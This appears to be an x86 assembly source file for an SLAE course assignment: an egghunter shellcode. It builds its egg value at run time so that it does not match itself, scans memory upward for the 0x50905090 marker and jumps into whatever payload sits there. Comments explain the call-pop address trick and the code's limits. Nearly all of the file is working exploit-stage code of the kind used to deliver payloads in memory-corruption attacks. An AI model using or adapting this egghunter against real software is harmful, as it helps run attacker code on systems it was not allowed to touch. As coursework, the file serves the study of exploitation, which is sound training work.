; SLAE-XXX
; copy paste need to make it original now
; assignment 3 : egghunter shellcode 
; originality : I used the call pop ret technique as the other ones were not working for me 
 

global _start

section .text


_start:
; its not possible to start from addres 0x0 as its unmapped by the proc and so will trigger segfault, so we need to use a valid address
; to do so we call a func , pop the ret address from the stack, restore it (push it) and now we have valid address in eax      
 jmp func; 
; egg signature is different from what is hardcoded here , its a trick to not detect this instruction address 
; see below why we use 0x50 and 0x90 
eggcreate:  
 mov ebx, dword 0x5090508f 
 inc ebx ; final egg code is in ebx
 
next_addr:
; increasing memory address to look at next address 
; limit 1: it will segfault when it wraps around to 0x1 
; limit 2: if the shell code is located below in memory it will not find it before segfault ofc :) 
 inc eax    
; check if our egg is at that memory address, if yes then set Zero Flag 
 cmp dword [eax], ebx 
; if Zero Flag is not set (check failed), then loop to next_addr
 jne next_addr  
; since we jump directly to the shellcode, the egg should be valid instructions and not breaks the execution
; here we used 0x50905090 , push eax and nop  
 jmp eax ; 
 
; function used to get valid address 
; see below 
func:
 pop eax 
 jmp eggcreate 
